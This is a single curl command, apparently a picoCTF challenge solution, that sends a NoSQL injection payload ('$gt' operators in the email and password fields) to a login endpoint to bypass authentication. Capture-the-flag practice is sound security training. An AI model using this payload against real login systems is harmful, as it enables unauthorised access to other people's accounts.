curl 'http://atlas.picoctf.net:55294/login' \
    -X POST \
    -H 'Content-Type: application/json' \
    --data-raw '{"email":"{\\"$gt\\":\\"\\"}","password":"{\\"$gt\\":\\"\\"}"}'
